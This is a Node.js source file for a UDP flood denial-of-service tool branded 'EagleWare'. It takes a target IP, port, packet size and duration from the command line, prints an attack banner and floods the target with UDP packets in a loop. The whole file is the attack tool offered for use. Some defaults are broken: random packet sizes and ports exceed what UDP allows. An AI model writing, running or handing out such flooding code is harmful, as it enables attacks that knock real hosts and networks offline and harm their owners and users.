const dgram = require('dgram');
const process = require('process');

const [,, ip, port, size, time] = process.argv;

const client = dgram.createSocket('udp4');

const endtime = Date.now() + (time ? time * 1000 : 100000);
const packetSize = size ? parseInt(size) : Math.floor(Math.random() * (1500000 - 64)) + 64;
const targetPort = port ? parseInt(port) : Math.floor(Math.random() * 1500000) + 1;

const centerText = (text, width) => {
    const padding = Math.max(0, Math.floor((width - text.length) / 2));
    return ' '.repeat(padding) + text;
};

const printAttackDetails = () => {
    console.clear();
    const width = process.stdout.columns || 80; 
    console.log(centerText("EagleWare Attack Details", width));
    console.log(centerText("╔════════════════════════════════════════╗", width));
    console.log(centerText(` Host: ${ip}`, width));
    console.log(centerText(` Port: ${targetPort}`, width));
    console.log(centerText(` Size: ${packetSize} bytes`, width));
    console.log(centerText(` Time: ${time} seconds`, width));
    console.log(centerText(` Method: UDP`, width));
    console.log(centerText(` This Method Is Under Development!`, width));
    console.log(centerText("╚════════════════════════════════════════╝", width));
    console.log(centerText("Reset your network if internet doesn't work", width));
};

printAttackDetails();

let packetCount = 0;

// this is an easter egg
// mr bumpkin needs a therapist

const sendPackets = () => {
    if (Date.now() > endtime) {
        client.close();
        return;
    }

    const message = Buffer.alloc(packetSize, 'flood');
    client.send(message, targetPort, ip, (err) => {
        if (err) {
            console.error('Error sending packet:', err);
            client.close();
        } else {
            packetCount++;
            setImmediate(sendPackets);
        }
    });
};

sendPackets();